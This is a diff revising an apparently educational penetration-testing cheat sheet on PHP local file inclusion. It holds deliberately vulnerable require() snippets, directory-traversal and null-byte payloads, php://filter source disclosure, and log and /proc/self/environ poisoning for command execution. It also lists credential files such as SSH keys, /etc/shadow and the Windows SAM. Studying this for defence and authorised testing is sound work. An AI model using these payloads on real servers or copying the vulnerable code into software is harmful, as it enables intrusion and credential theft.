@@ -1,39 +1,52 @@
-# Local file inclusion
+# Local File Inclusion (LFI)
 
-Local file inclusion means unauthorized access to filesystem.
+Local file inclusion means unauthorized access to files on the system. This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell.
 
-With this we can get a hold of many sensitive files
 
-In most web-services that use a database we can get a hold of the database username and password:
+## How does it work?
 
-in wordpress the file is **wp-config.php**  
-And once you have gotten access to that you can do other things. Check out the chapter on mysql.
-
-This is the definitive guide to Local File inclusion  
-[https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)
-
-And this  
-[http://securityidiots.com/Web-Pentest/LFI](http://securityidiots.com/Web-Pentest/LFI)
-
-And this:
-
-[https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
-
-The vulnerability stems from unsanitized user-input
+The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. 
 
 Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.
 
-```
-# index.php
-    <?php
-      $file = $_GET['page'];
-      require($file);
-     ?>
+```php
+$file = $_GET['page'];
+require($file);
 ```
 
-## Bypassing execution
+In this example the user could just enter this string and retrieve the `/etc/passwd` file.
 
-So if you an LFI you might have notices that you can read txt-files but not .php files, since they are executed and not read. There is a bypass around that
+```
+http://example.com/page=../../../../../../etc/passwd
+```
+
+
+### Bypassing the added .php and other extra file-endings
+
+It is common to add the file-extension through the php-code. Here is how this would look like:
+
+```php
+$file = $_GET['page'];
+require($file . ".php");
+```
+
+The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file `/etc/passwd.php` does not exist. However, if we add the nullbyte to the end of our attack-string the `.php` will not be taken into account. So we add `%00` to the end of our attack-string.
+
+```
+http://example.com/page=../../../../../../etc/passwd%00
+```
+This technique is usually called the nullbyte technique since `%00` is the nullbyte. The technique only works in versions below php 5.3. So look out for that.
+
+
+Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:
+
+```
+http://example.com/page=../../../../../../etc/passwd?
+```
+
+## Bypassing php-execution
+
+So if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.
 
 ```
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
@@ -45,37 +58,13 @@ Here you use a php-filter to convert it all into base64. So in return you get th
 base64 -d savefile.php
 ```
 
-### Bypassing .php and other extra file-endings
-
-The nullbyte technique works in versions below php 5.3. So look out for that.
-
-If the include looks like this:
-
-```
-# index.php
-    <?php
-      $file = $_GET['page'];
-      require($file . ".php");
-     ?>
-```
-
-The php i added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the **.php** will not be taken into account. So we add **%00** to the end of our attackstring.
-
-As noted above this will only work for php below 5.3. So another way to deal with it is just to add a question mark.This way the stuff after gets interpreted as a paramter and therefore excluded.
-
-`http://example.com/page=http://192.168.1.101/maliciousfile.txt?`
 
 ## Linux
 
 ### Tricks
 
-Check if a folder exists, go into it and the go out.
-
-```
-index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00"
-```
-
 **Download config-files in a nice style-format**  
+
 If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround:
 
 ```
@@ -104,11 +93,13 @@ $USER/.bash_history or .profile
 
 Comes from here: [https://gist.github.com/sckalath/a8fd4e754a72015aa0b8](https://gist.github.com/sckalath/a8fd4e754a72015aa0b8)
 
+```
 /etc/mtab  
 /etc/inetd.conf  
 /var/log/dmessage
+```
 
-#### Web server files
+**Web server files**
 
 ```
 # Usually found in the root of the website
@@ -116,7 +107,7 @@ Comes from here: [https://gist.github.com/sckalath/a8fd4e754a72015aa0b8](https:/
 config.php
 ```
 
-#### SSH
+**SSH**
 
 ```
 authorized_keys
@@ -126,7 +117,7 @@ id_rsa.pub
 known_hosts
 ```
 
-#### Logs
+**Logs**
 
 ```
 /etc/httpd/logs/acces_log 
@@ -142,18 +133,7 @@ known_hosts
 /var/log/access_log
 ```
 
-#### General files
-
-First you need to check the passwd file to find the users.
-
-```
-cat /etc/passwd
-cat /etc/group
-cat /etc/shadow
-/var/mail/
-```
-
-#### User specific files
+**User specific files**
 
 Found in the home-directory
 
@@ -163,7 +143,7 @@ Found in the home-directory
 .my.cnf
 ```
 
-#### Proc files
+**Proc files**
 
 "Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process."
 
@@ -191,9 +171,9 @@ Found in the home-directory
 
 Under the right circumstances you might be able to get a shell from a LFI
 
-### Log files
+### Log poising
 
-There are some requirements. We need to be able to read the apache2 log files, either the success.log or the error.log
+There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log
 
 So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.
 
@@ -228,12 +208,16 @@ Connection: close
 
 **Execute it in the browser**
 
+Now you can request the log-file through the LFI and see the php-code get executed. 
+
 ```
-http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
+http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ```
 
 
 ### Proc files
+
+If you can read the proc-files on the system you might be able to poison them through the user-agent.
 
 We can also inject code into /proc/self/environ through the user-agent
 
@@ -266,6 +250,9 @@ c:\home\bin\stable\apache\php.ini
 ```
 
 **Logs**
+
+Common path for apache log files on windows:
+
 ```
 c:\Program Files\Apache Group\Apache\logs\access.log  
 c:\Program Files\Apache Group\Apache\logs\error.log
@@ -304,6 +291,16 @@ windows\repair\SAM
 ```
 
 ## References:
+
+This is the definitive guide to Local File inclusion  
+[https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)
+
+And this  
+[http://securityidiots.com/Web-Pentest/LFI](http://securityidiots.com/Web-Pentest/LFI)
+
+And this:
+
+[https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
 
 [https://nets.ec/File\_Inclusion](https://nets.ec/File_Inclusion)  
 
